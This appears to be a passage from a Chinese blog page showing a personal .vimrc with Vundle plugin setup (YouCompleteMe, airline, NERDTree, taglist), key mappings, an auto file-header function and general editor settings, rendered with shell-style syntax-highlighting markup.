<h2 id="配置-vimrc"><a href="#配置-vimrc" class="headerlink" title="配置.vimrc"></a>配置.vimrc</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> nocompatible              <span class="string">&quot; be iMproved, required</span></span><br><span class="line"><span class="string">filetype off                  &quot;</span> required</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; set the runtime path to include Vundle and initialize</span></span><br><span class="line"><span class="string">set rtp+=~/.vim/bundle/Vundle.vim</span></span><br><span class="line"><span class="string">call vundle#begin()</span></span><br><span class="line"><span class="string">&quot;</span> alternatively, pass a path <span class="built_in">where</span> Vundle should install plugins</span><br><span class="line"><span class="string">&quot;call vundle#begin(&#x27;~/some/path/here&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> <span class="built_in">let</span> Vundle manage Vundle, required</span><br><span class="line">Plugin <span class="string">&#x27;VundleVim/Vundle.vim&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; YouCompeleteMe: 语句补全插件</span></span><br><span class="line"><span class="string">set runtimepath+=~/.vim/bundle/YouCompleteMe</span></span><br><span class="line"><span class="string">autocmd InsertLeave * if pumvisible() == 0|pclose|endif &quot;</span>离开插入模式后自动关闭预览窗口</span><br><span class="line"><span class="built_in">let</span> g:ycm_collect_identifiers_from_tags_files = 1           <span class="string">&quot; 开启 YCM基于标签引擎</span></span><br><span class="line"><span class="string">let g:ycm_collect_identifiers_from_comments_and_strings = 1 &quot;</span> 注释与字符串中的内容也用于补全</span><br><span class="line"><span class="built_in">let</span> g:syntastic_ignore_files=[<span class="string">&quot;.*\.py$&quot;</span>]</span><br><span class="line"><span class="built_in">let</span> g:ycm_seed_identifiers_with_syntax = 1                  <span class="string">&quot; 语法关键字补全</span></span><br><span class="line"><span class="string">let g:ycm_complete_in_comments = 1</span></span><br><span class="line"><span class="string">let g:ycm_confirm_extra_conf = 0                            &quot;</span> 关闭加载.ycm_extra_conf.py提示</span><br><span class="line"><span class="built_in">let</span> g:ycm_key_list_select_completion = [<span class="string">&#x27;&lt;c-n&gt;&#x27;</span>, <span class="string">&#x27;&lt;Down&gt;&#x27;</span>]  <span class="string">&quot; 映射按键,没有这个会拦截掉tab, 导致其他插件的tab不能用.</span></span><br><span class="line"><span class="string">let g:ycm_key_list_previous_completion = [&#x27;&lt;c-p&gt;&#x27;, &#x27;&lt;Up&gt;&#x27;]</span></span><br><span class="line"><span class="string">let g:ycm_complete_in_comments = 1                          &quot;</span> 在注释输入中也能补全</span><br><span class="line"><span class="built_in">let</span> g:ycm_complete_in_strings = 1                           <span class="string">&quot; 在字符串输入中也能补全</span></span><br><span class="line"><span class="string">let g:ycm_collect_identifiers_from_comments_and_strings = 1 &quot;</span> 注释和字符串中的文字也会被收入补全</span><br><span class="line"><span class="built_in">let</span> g:ycm_global_ycm_extra_conf=<span class="string">&#x27;~/.vim/bundle/YouCompleteMe/third_party/ycmd/cpp/ycm/.ycm_extra_conf.py&#x27;</span></span><br><span class="line"><span class="built_in">let</span> g:ycm_show_diagnostics_ui = 0                           <span class="string">&quot; 禁用语法检查</span></span><br><span class="line"><span class="string">inoremap &lt;expr&gt; &lt;CR&gt; pumvisible() ? &quot;</span>\&lt;C-y&gt;<span class="string">&quot; : &quot;</span>\&lt;CR&gt;<span class="string">&quot;             &quot;</span> 回车即选中当前项</span><br><span class="line">nnoremap &lt;c-j&gt; :YcmCompleter GoToDefinitionElseDeclaration&lt;CR&gt;     <span class="string">&quot; 跳转到定义处</span></span><br><span class="line"><span class="string">let g:ycm_min_num_of_chars_for_completion=2                 &quot;</span> 从第2个键入字符就开始罗列匹配项</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; github 仓库中的插件</span></span><br><span class="line"><span class="string">&quot;</span> vim-airline 配置：优化vim界面</span><br><span class="line">Plugin <span class="string">&#x27;vim-airline/vim-airline&#x27;</span></span><br><span class="line"><span class="string">&quot;let g:airline#extensions#tabline#enabled = 1</span></span><br><span class="line"><span class="string">&quot;</span> airline 设置</span><br><span class="line"><span class="string">&quot; 显示颜色</span></span><br><span class="line"><span class="string">set t_Co=256</span></span><br><span class="line"><span class="string">set laststatus=2</span></span><br><span class="line"><span class="string">&quot;</span> 使用powerline打过补丁的字体</span><br><span class="line"><span class="built_in">let</span> g:airline_powerline_fonts = 1</span><br><span class="line"><span class="string">&quot; 开启tabline</span></span><br><span class="line"><span class="string">let g:airline#extensions#tabline#enabled=1</span></span><br><span class="line"><span class="string">&quot;</span> tabline中当前buffer两端的分隔字符</span><br><span class="line"><span class="built_in">let</span> g:airline#extensions#tabline#left_sep = <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="string">&quot; tabline中未激活buffer两端的分隔字符</span></span><br><span class="line"><span class="string">let g:airline#extensions#tabline#left_alt_sep = &#x27; &#x27;</span></span><br><span class="line"><span class="string">&quot;</span> tabline中buffer显示编号</span><br><span class="line"><span class="built_in">let</span> g:airline#extensions#tabline#buffer_nr_show = 1</span><br><span class="line"><span class="string">&quot; 映射切换buffer的键位</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">nnoremap [b :bp&lt;CR&gt;</span></span><br><span class="line"><span class="string">nnoremap ]b :bn&lt;CR&gt;</span></span><br><span class="line"><span class="string">&quot;</span> 映射&lt;leader&gt;num到num buffer</span><br><span class="line">map &lt;leader&gt;1 :b 1&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;2 :b 2&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;3 :b 3&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;4 :b 4&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;5 :b 5&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;6 :b 6&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;7 :b 7&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;8 :b 8&lt;CR&gt;</span><br><span class="line">map &lt;leader&gt;9 :b 9&lt;CR&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot; vim-scripts 中的插件</span></span><br><span class="line"><span class="string">Plugin &#x27;taglist.vim&#x27;</span></span><br><span class="line"><span class="string">&quot;</span> ctags 配置: F3快捷键显示程序中的各种tags，包括变量和函数</span><br><span class="line">map &lt;F3&gt; :TlistToggle&lt;CR&gt;</span><br><span class="line"><span class="built_in">let</span> Tlist_Use_Right_Window=1</span><br><span class="line"><span class="built_in">let</span> Tlist_Show_One_File=1</span><br><span class="line"><span class="built_in">let</span> Tlist_Exit_OnlyWindow=1</span><br><span class="line"><span class="built_in">let</span> Tlist_WinWidt=25</span><br><span class="line"></span><br><span class="line">Plugin <span class="string">&#x27;The-NERD-tree&#x27;</span></span><br><span class="line"><span class="string">&quot;NERDTree 配置: F2快捷键显示当前目录树</span></span><br><span class="line"><span class="string">map &lt;F2&gt; :NERDTreeToggle&lt;CR&gt;</span></span><br><span class="line"><span class="string">let NERDTreeWinSize=25</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Plugin &#x27;indentLine.vim&#x27;</span></span><br><span class="line"><span class="string">Plugin &#x27;delimitMate.vim&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> 非 github 仓库的插件</span><br><span class="line"><span class="string">&quot; Plugin &#x27;git://git.wincent.com/command-t.git&#x27;</span></span><br><span class="line"><span class="string">Plugin &#x27;git@github.com:vim-python/python-syntax.git&#x27;</span></span><br><span class="line"><span class="string">let g:python_highlight_all = 1</span></span><br><span class="line"><span class="string">let g:python_highlight_indent_errors = 0</span></span><br><span class="line"><span class="string">&quot;</span> 本地仓库的插件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; All of your Plugins must be added before the following line</span></span><br><span class="line"><span class="string">call vundle#end()            &quot;</span> required</span><br><span class="line">filetype plugin indent on    <span class="string">&quot; required</span></span><br><span class="line"><span class="string">&quot;</span> To ignore plugin indent changes, instead use:</span><br><span class="line"><span class="string">&quot;filetype plugin on</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot; Brief help</span></span><br><span class="line"><span class="string">&quot;</span> :PluginList       - lists configured plugins</span><br><span class="line"><span class="string">&quot; :PluginInstall    - installs plugins; append `!` to update or just :PluginUpdate</span></span><br><span class="line"><span class="string">&quot;</span> :PluginSearch foo - searches <span class="keyword">for</span> foo; append `!` to refresh <span class="built_in">local</span> cache</span><br><span class="line"><span class="string">&quot; :PluginClean      - confirms removal of unused plugins; append `!` to auto-approve removal</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot; see :h vundle for more details or wiki for FAQ</span></span><br><span class="line"><span class="string">&quot;</span> Put your non-Plugin stuff after this line</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span>新文件标题</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;新建.c,.h,.sh,.java文件，自动插入文件头</span></span><br><span class="line"><span class="string">autocmd BufNewFile *.cpp,*.[ch],*.sh,*.java exec &quot;</span>:call SetTitle()<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;定义函数SetTitle，自动插入文件头</span></span><br><span class="line"><span class="string">func SetTitle()</span></span><br><span class="line"><span class="string">	&quot;</span>如果文件类型为.sh文件</span><br><span class="line">	<span class="keyword">if</span> &amp;filetype == <span class="string">&#x27;sh&#x27;</span></span><br><span class="line">		call setline(1, <span class="string">&quot;##########################################################################&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>), <span class="string">&quot;# File Name: &quot;</span>.<span class="built_in">expand</span>(<span class="string">&quot;%&quot;</span>))</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+1, <span class="string">&quot;# Author: eutopia&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+2, <span class="string">&quot;# mail: 2715417602@qq.com&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+3, <span class="string">&quot;# Created Time: &quot;</span>.strftime(<span class="string">&quot;%c&quot;</span>))</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+4, <span class="string">&quot;#########################################################################&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+5, <span class="string">&quot;#!/bin/bash&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+8, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		call setline(1, <span class="string">&quot;/*************************************************************************&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>), <span class="string">&quot;	&gt; File Name: &quot;</span>.<span class="built_in">expand</span>(<span class="string">&quot;%&quot;</span>))</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+1, <span class="string">&quot;	&gt; Author: eutopia&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+2, <span class="string">&quot;	&gt; Mail: 2715417602@qq.com &quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+3, <span class="string">&quot;	&gt; Created Time: &quot;</span>.strftime(<span class="string">&quot;%c&quot;</span>))</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+4, <span class="string">&quot; ************************************************************************/&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+5, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	endif</span><br><span class="line">	<span class="keyword">if</span> &amp;filetype == <span class="string">&#x27;cpp&#x27;</span></span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+6, <span class="string">&quot;#include&lt;iostream&gt;&quot;</span>)</span><br><span class="line">    	call append(line(<span class="string">&quot;.&quot;</span>)+7, <span class="string">&quot;using namespace std;&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+8, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	endif</span><br><span class="line">	<span class="keyword">if</span> &amp;filetype == <span class="string">&#x27;c&#x27;</span></span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+6, <span class="string">&quot;#include&lt;stdio.h&gt;&quot;</span>)</span><br><span class="line">		call append(line(<span class="string">&quot;.&quot;</span>)+7, <span class="string">&quot;&quot;</span>)</span><br><span class="line">	endif</span><br><span class="line">	<span class="string">&quot;	if &amp;filetype == &#x27;java&#x27;</span></span><br><span class="line"><span class="string">	&quot;</span>		call append(line(<span class="string">&quot;.&quot;</span>)+6,<span class="string">&quot;public class &quot;</span>.<span class="built_in">expand</span>(<span class="string">&quot;%&quot;</span>))</span><br><span class="line">	<span class="string">&quot;		call append(line(&quot;</span>.<span class="string">&quot;)+7,&quot;</span><span class="string">&quot;)</span></span><br><span class="line"><span class="string">	&quot;</span>	endif</span><br><span class="line">	<span class="string">&quot;新建文件后，自动定位到文件末尾</span></span><br><span class="line"><span class="string">	autocmd BufNewFile * normal G</span></span><br><span class="line"><span class="string">endfunc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span> 映射全选+复制 ctrl + a</span><br><span class="line">map &lt;C-A&gt; ggVGY</span><br><span class="line">map! &lt;C-A&gt; &lt;Esc&gt;ggVGY</span><br><span class="line">map &lt;F12&gt; gg=G</span><br><span class="line"><span class="string">&quot; 选中状态下 Crtl+c 复制</span></span><br><span class="line"><span class="string">vmap &lt;C-c&gt; &quot;</span>+y</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;</span>实用设置</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span> 设置当文件被改动时自动载入</span><br><span class="line"><span class="built_in">set</span> autoread</span><br><span class="line"><span class="string">&quot; quickfix模式</span></span><br><span class="line"><span class="string">autocmd FileType c,cpp map &lt;buffer&gt; &lt;leader&gt;&lt;space&gt; :w&lt;cr&gt;:make&lt;cr&gt;</span></span><br><span class="line"><span class="string">&quot;</span>代码补全</span><br><span class="line"><span class="built_in">set</span> completeopt=preview,menu</span><br><span class="line"><span class="string">&quot;允许插件</span></span><br><span class="line"><span class="string">filetype plugin on</span></span><br><span class="line"><span class="string">&quot;</span>共享剪贴板</span><br><span class="line"><span class="built_in">set</span> clipboard=unnamedplus</span><br><span class="line"><span class="string">&quot;从不备份</span></span><br><span class="line"><span class="string">set nobackup</span></span><br><span class="line"><span class="string">&quot;</span>make 运行</span><br><span class="line">:<span class="built_in">set</span> makeprg=g++\ -Wall\ \ %</span><br><span class="line"><span class="string">&quot;自动保存</span></span><br><span class="line"><span class="string">set autowrite</span></span><br><span class="line"><span class="string">set ruler                   &quot;</span> 打开状态栏标尺</span><br><span class="line"><span class="built_in">set</span> cursorline              <span class="string">&quot; 突出显示当前行</span></span><br><span class="line"><span class="string">set magic                   &quot;</span> 设置魔术</span><br><span class="line"><span class="built_in">set</span> guioptions-=T           <span class="string">&quot; 隐藏工具栏</span></span><br><span class="line"><span class="string">set guioptions-=m           &quot;</span> 隐藏菜单栏</span><br><span class="line"><span class="string">&quot;set statusline=\ %&lt;%F[%1*%M%*%n%R%H]%=\ %y\ %0(%&#123;&amp;fileformat&#125;\ %&#123;&amp;encoding&#125;\ %c:%l/%L%)\</span></span><br><span class="line"><span class="string">&quot;</span> 设置在状态行显示的信息</span><br><span class="line"><span class="string">&quot; set foldcolumn=0</span></span><br><span class="line"><span class="string">&quot;</span> <span class="built_in">set</span> foldmethod=indent</span><br><span class="line"><span class="string">&quot; set foldlevel=3</span></span><br><span class="line"><span class="string">&quot;</span> <span class="built_in">set</span> foldenable              <span class="string">&quot; 开始折叠</span></span><br><span class="line"><span class="string">&quot;</span> 不要使用vi的键盘模式，而是vim自己的</span><br><span class="line"><span class="built_in">set</span> nocompatible</span><br><span class="line"><span class="string">&quot; 语法高亮</span></span><br><span class="line"><span class="string">syntax on</span></span><br><span class="line"><span class="string">&quot;</span> 去掉输入错误的提示声音</span><br><span class="line"><span class="built_in">set</span> noeb</span><br><span class="line"><span class="string">&quot; 在处理未保存或只读文件的时候，弹出确认</span></span><br><span class="line"><span class="string">set confirm</span></span><br><span class="line"><span class="string">&quot;</span> 自动缩进</span><br><span class="line"><span class="built_in">set</span> autoindent</span><br><span class="line"><span class="built_in">set</span> cindent</span><br><span class="line"><span class="string">&quot; Tab键的宽度</span></span><br><span class="line"><span class="string">set tabstop=4</span></span><br><span class="line"><span class="string">&quot;</span> 统一缩进为4</span><br><span class="line"><span class="built_in">set</span> softtabstop=4</span><br><span class="line"><span class="built_in">set</span> shiftwidth=4</span><br><span class="line"><span class="string">&quot; 不要用空格代替制表符</span></span><br><span class="line"><span class="string">set noexpandtab</span></span><br><span class="line"><span class="string">&quot;</span> 在行和段开始处使用制表符</span><br><span class="line"><span class="built_in">set</span> smarttab</span><br><span class="line"><span class="string">&quot; 显示行号</span></span><br><span class="line"><span class="string">set number</span></span><br><span class="line"><span class="string">&quot;</span> 历史记录数</span><br><span class="line"><span class="built_in">set</span> <span class="built_in">history</span>=1000</span><br><span class="line"><span class="string">&quot;禁止生成临时文件</span></span><br><span class="line"><span class="string">set nobackup</span></span><br><span class="line"><span class="string">set noswapfile</span></span><br><span class="line"><span class="string">&quot;</span>搜索忽略大小写</span><br><span class="line"><span class="built_in">set</span> ignorecase</span><br><span class="line"><span class="string">&quot;搜索逐字符高亮</span></span><br><span class="line"><span class="string">set hlsearch</span></span><br><span class="line"><span class="string">set incsearch</span></span><br><span class="line"><span class="string">&quot;</span>行内替换</span><br><span class="line"><span class="built_in">set</span> gdefault</span><br><span class="line"><span class="string">&quot;编码设置</span></span><br><span class="line"><span class="string">set enc=utf-8</span></span><br><span class="line"><span class="string">set fencs=utf-8,ucs-bom,shift-jis,gb18030,gbk,gb2312,cp936</span></span><br><span class="line"><span class="string">&quot;</span>语言设置</span><br><span class="line"><span class="built_in">set</span> langmenu=zh_CN.UTF-8</span><br><span class="line"><span class="built_in">set</span> helplang=cn</span><br><span class="line"><span class="string">&quot; 我的状态行显示的内容（包括文件类型和解码）</span></span><br><span class="line"><span class="string">set statusline=%F%m%r%h%w\ [FORMAT=%&#123;&amp;ff&#125;]\ [TYPE=%Y]\ [POS=%l,%v][%p%%]\ %&#123;strftime(\&quot;%d/%m/%y\ -\ %H:%M\&quot;)&#125;</span></span><br><span class="line"><span class="string">set statusline=[%F]%y%r%m%*%=[Line:%l/%L,Column:%c][%p%%]</span></span><br><span class="line"><span class="string">&quot;</span> 总是显示状态行</span><br><span class="line"><span class="built_in">set</span> laststatus=2</span><br><span class="line"><span class="string">&quot; 命令行（在状态行下）的高度，默认为1，这里是2</span></span><br><span class="line"><span class="string">set cmdheight=2</span></span><br><span class="line"><span class="string">&quot;</span> 侦测文件类型</span><br><span class="line">filetype on</span><br><span class="line"><span class="string">&quot; 载入文件类型插件</span></span><br><span class="line"><span class="string">filetype plugin on</span></span><br><span class="line"><span class="string">&quot;</span> 为特定文件类型载入相关缩进文件</span><br><span class="line">filetype indent on</span><br><span class="line"><span class="string">&quot; 保存全局变量</span></span><br><span class="line"><span class="string">set viminfo+=!</span></span><br><span class="line"><span class="string">&quot;</span> 带有如下符号的单词不要被换行分割</span><br><span class="line"><span class="built_in">set</span> iskeyword+=_,$,@,%,#,-</span><br><span class="line"><span class="string">&quot; 字符间插入的像素行数目</span></span><br><span class="line"><span class="string">set linespace=0</span></span><br><span class="line"><span class="string">&quot;</span> 增强模式中的命令行自动完成操作</span><br><span class="line"><span class="built_in">set</span> wildmenu</span><br><span class="line"><span class="string">&quot; 使回格键（backspace）正常处理indent, eol, start等</span></span><br><span class="line"><span class="string">set backspace=2</span></span><br><span class="line"><span class="string">&quot;</span> 允许backspace和光标键跨越行边界</span><br><span class="line"><span class="built_in">set</span> whichwrap+=&lt;,&gt;,h,l</span><br><span class="line"><span class="string">&quot; 可以在buffer的任何地方使用鼠标（类似office中在工作区双击鼠标定位）</span></span><br><span class="line"><span class="string">set mouse=a</span></span><br><span class="line"><span class="string">set selection=exclusive</span></span><br><span class="line"><span class="string">set selectmode=mouse,key</span></span><br><span class="line"><span class="string">&quot;</span> 通过使用: commands命令，告诉我们文件的哪一行被改变过</span><br><span class="line"><span class="built_in">set</span> report=0</span><br><span class="line"><span class="string">&quot; 在被分割的窗口间显示空白，便于阅读</span></span><br><span class="line"><span class="string">set fillchars=vert:\ ,stl:\ ,stlnc:\</span></span><br><span class="line"><span class="string">&quot;</span> 高亮显示匹配的括号</span><br><span class="line"><span class="built_in">set</span> showmatch</span><br><span class="line"><span class="string">&quot; 匹配括号高亮的时间（单位是十分之一秒）</span></span><br><span class="line"><span class="string">set matchtime=1</span></span><br><span class="line"><span class="string">&quot;</span> 光标移动到buffer的顶部和底部时保持3行距离</span><br><span class="line"><span class="built_in">set</span> scrolloff=3</span><br><span class="line"><span class="string">&quot; 为C程序提供自动缩进</span></span><br><span class="line"><span class="string">set smartindent</span></span><br><span class="line"><span class="string">&quot;</span> 高亮显示普通txt文件（需要txt.vim脚本）</span><br><span class="line"> au BufRead,BufNewFile *  setfiletype txt</span><br><span class="line"><span class="string">&quot;自动补全</span></span><br><span class="line"><span class="string">:inoremap ( ()&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">:inoremap ) &lt;c-r&gt;=ClosePair(&#x27;)&#x27;)&lt;CR&gt;</span></span><br><span class="line"><span class="string">&quot;</span>:inoremap &#123; &#123;&lt;CR&gt;&#125;&lt;ESC&gt;O</span><br><span class="line"><span class="string">&quot;:inoremap &#125; &lt;c-r&gt;=ClosePair(&#x27;&#125;&#x27;)&lt;CR&gt;</span></span><br><span class="line"><span class="string">:inoremap [ []&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">:inoremap ] &lt;c-r&gt;=ClosePair(&#x27;]&#x27;)&lt;CR&gt;</span></span><br><span class="line"><span class="string">:inoremap &quot;</span> <span class="string">&quot;&quot;</span>&lt;ESC&gt;i</span><br><span class="line">:inoremap <span class="string">&#x27; &#x27;</span><span class="string">&#x27;&lt;ESC&gt;i</span></span><br><span class="line"><span class="string">function! ClosePair(char)</span></span><br><span class="line"><span class="string">	if getline(&#x27;</span>.<span class="string">&#x27;)[col(&#x27;</span>.<span class="string">&#x27;) - 1] == a:char</span></span><br><span class="line"><span class="string">		return &quot;\&lt;Right&gt;&quot;</span></span><br><span class="line"><span class="string">	else</span></span><br><span class="line"><span class="string">		return a:char</span></span><br><span class="line"><span class="string">	endif</span></span><br><span class="line"><span class="string">endfunction</span></span><br><span class="line"><span class="string">filetype plugin indent on</span></span><br><span class="line"><span class="string">&quot;打开文件类型检测, 加了这句才可以用智能补全</span></span><br><span class="line"><span class="string">set completeopt=longest,menu</span></span><br><span class="line"><span 